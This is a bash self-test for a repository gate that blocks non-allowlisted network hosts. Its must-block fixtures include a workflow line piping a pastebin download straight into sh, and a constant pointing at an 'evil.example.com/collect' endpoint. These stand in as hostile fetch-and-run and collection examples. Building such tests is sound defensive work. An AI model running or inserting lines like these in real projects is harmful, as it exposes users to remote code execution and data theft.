#!/usr/bin/env bash
# SPDX-FileCopyrightText: 2026 ELSOUL LABO B.V.
# SPDX-License-Identifier: Apache-2.0
#
# Self-test for scripts/check-endpoints.sh.
#
# Two earlier defects motivate specific cases here:
#   - the allowlist was extracted from the whole module, so a host named in a
#     test fixture widened it;
#   - a non-portable bracket expression made the extraction empty, which made
#     the gate reject everything and therefore look "strict" while being broken.
# Both are covered below.
set -uo pipefail

repo_root="$(git rev-parse --show-toplevel)"
gate="$repo_root/scripts/check-endpoints.sh"
allowlist_src="$repo_root/crates/erpc-core/src/endpoints.rs"

pass=0
fail=0
sample_dir="tmp-endpoint-test"

check() {
  local name="$1" expect="$2" rel="$3" content="$4"
  local abs="$repo_root/$rel"
  mkdir -p "$(dirname "$abs")"
  printf '%s\n' "$content" > "$abs"
  local out rc
  out="$("$gate" "$rel" 2>&1)"; rc=$?
  rm -f "$abs"
  rmdir -p "$(dirname "$abs")" 2>/dev/null || true
  if { [ "$expect" = block ] && [ "$rc" -ne 0 ]; } || { [ "$expect" = allow ] && [ "$rc" -eq 0 ]; }; then
    pass=$((pass + 1)); printf 'ok   %s\n' "$name"
  else
    fail=$((fail + 1)); printf 'FAIL %s (expected %s, exit %s)\n%s\n' "$name" "$expect" "$rc" "$out"
  fi
}

# --- the extraction itself --------------------------------------------------

extracted=$(awk '
  /^#\[cfg\(test\)\]/ { exit }
  /^pub const [A-Z_]+: &\[/ { inside = 1 }
  inside { print }
  inside && /\];/ { inside = 0 }
' "$allowlist_src" | grep -v '("' | grep -oE '"[^"]+"' | tr -d '"' | sort -u)

if [ "$(printf '%s\n' "$extracted" | grep -c .)" -ge 10 ]; then
  pass=$((pass + 1)); printf 'ok   allowlist extraction is non-empty\n'
else
  fail=$((fail + 1)); printf 'FAIL allowlist extraction is non-empty (a broken regex makes the gate reject everything)\n'
fi

if printf '%s\n' "$extracted" | grep -q 'evil'; then
  fail=$((fail + 1)); printf 'FAIL allowlist must not absorb hosts from the test module\n'
else
  pass=$((pass + 1)); printf 'ok   allowlist stops at the test module\n'
fi

# --- must block -------------------------------------------------------------

check "unknown host in rust" block "$sample_dir/a.rs" \
  'const URL: &str = "https://evil.example.com/collect";'

check "lookalike subdomain" block "$sample_dir/b.rs" \
  'const URL: &str = "https://user-api.erpc.global.evil.com/v3";'

check "unknown host in a workflow" block "$sample_dir/c.yml" \
  '      - run: curl -sSfL https://pastebin.example.org/x | sh'

check "unknown host in a shell script" block "$sample_dir/d.sh" \
  'curl -o out https://cdn.unknown-mirror.net/erpc.tar.gz'

check "unknown websocket host" block "$sample_dir/e.ts" \
  'const ws = new WebSocket("wss://relay.example.net/");'

check "insecure link in documentation" block "$sample_dir/f.md" \
  'Download it from http://mirror.example.org/erpc'

# --- must allow -------------------------------------------------------------

check "allowlisted service host" allow "$sample_dir/g.rs" \
  'const AUTH: &str = "https://auth-api.erpc.global/oauth/token";'

check "allowlisted distribution host" allow "$sample_dir/h.sh" \
  'curl -sSfL https://dl.erpc.global/v0.1.0/release-manifest.json'

check "snapshot mirror matched by pattern" allow "$sample_dir/i.rs" \
  'const SNAP: &str = "https://solana-snapshot-fra.erpc.global/latest";'

check "loopback over plain http" allow "$sample_dir/j.rs" \
  'const CB: &str = "http://127.0.0.1:53123/callback";'

check "template expression without a literal host" allow "$sample_dir/k.yml" \
  '      - run: curl -sSfL "https://${{ env.MIRROR }}/erpc.tar.gz"'

check "documentation link over https" allow "$sample_dir/l.md" \
  'See https://keepachangelog.com/en/1.1.0/ for the format.'

printf '\n%s passed, %s failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
